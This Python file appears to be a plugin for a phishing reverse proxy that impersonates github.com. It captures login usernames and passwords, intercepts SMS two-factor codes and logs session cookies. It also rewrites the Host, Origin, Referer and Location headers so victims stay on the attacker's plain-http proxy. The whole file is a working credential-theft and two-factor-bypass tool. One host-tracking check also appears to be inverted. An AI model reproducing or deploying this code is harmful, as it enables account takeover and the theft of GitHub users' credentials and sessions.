import urllib.parse
from dataclasses import dataclass

# The hostname the client is sending requests to
actual_host: bytes = b""


# HTTP Request and response data class defnitions
@dataclass
class HttpRequest:
    method: bytes
    target: bytes
    headers: list[tuple[bytes, bytes]]
    body: bytes


@dataclass
class HttpResponse:
    status_code: int
    headers: list[tuple[bytes, bytes]]
    body: bytes


def modify_request(request: HttpRequest) -> HttpRequest:

    global actual_host

    # Get route
    log: str = ""  # Log
    log += "[plugins/github.com:modify_request] %s request for %s\n" % (
        request.method.decode(),
        request.target.decode(),
    )  # Log

    # Get username and password
    if request.target == b"/session" and request.method == b"POST":
        username = request.body.split(b"&login=")[1].split(b"&")[0].decode()
        username = urllib.parse.unquote(username)

        password = request.body.split(b"&password=")[1].split(b"&")[0].decode()
        password = urllib.parse.unquote(password)
        log += "[plugins/github.com:modify_request] Found credentials -> %s:%s\n" % (
            username,
            password,
        )

    # Get SMS OTP code
    if request.target == b"/sessions/two-factor":
        sms_otp = request.body.split(b"&")[1].split(b"=")[1]
        log += "[plugins/github.com:modify_request] SMS OTP Intercepted -> %s\n" % (
            sms_otp.decode()
        )  # Log

    # Get cookie values if requesting dashboard (means the user logged in succesfully)
    if request.target == b"/" or request.target == b"/dashboard":
        for header in request.headers:
            if header[0].decode().lower() == "cookie":
                _cookies = header[1].decode().split(";")
                for _cookie in _cookies:
                    log += (
                        "[plugins/github.com:modify_request] Intercepted cookie -> %s\n"
                        % (_cookie.lstrip())
                    )  # Log
    print(log.strip())  # Log

    # Modify headers
    for _hi in range(0, len(request.headers)):
        if request.headers[_hi][0].lower() == b"host":
            if actual_host != b"":
                actual_host = request.headers[_hi][1]
            request.headers[_hi] = (request.headers[_hi][0], b"github.com")

        if request.headers[_hi][0].lower() == b"origin":
            request.headers[_hi] = (
                request.headers[_hi][0],
                request.headers[_hi][1].replace(actual_host, b"github.com"),
            )
            request.headers[_hi] = (
                request.headers[_hi][0],
                request.headers[_hi][1].replace(b"http:", b"https:"),
            )

        if request.headers[_hi][0].lower() == b"referer":
            request.headers[_hi] = (
                request.headers[_hi][0],
                request.headers[_hi][1].replace(actual_host, b"github.com"),
            )
            request.headers[_hi] = (
                request.headers[_hi][0],
                request.headers[_hi][1].replace(b"http:", b"https:"),
            )

    # Do not upgrade to HTTPS
    for _hi in range(0, len(request.headers)):
        if request.headers[_hi][0].lower() == b"upgrade-insecure-requests":
            del request.headers[_hi]
            break

    return request


def modify_response(response: HttpResponse) -> HttpResponse:

    # Modify headers
    for _hi in range(0, len(response.headers)):
        if response.headers[_hi][0].lower() == b"location":
            response.headers[_hi] = (
                response.headers[_hi][0],
                response.headers[_hi][1].replace(b"github.com", actual_host),
            )
            response.headers[_hi] = (
                response.headers[_hi][0],
                response.headers[_hi][1].replace(b"https:", b"http:"),
            )

    return response
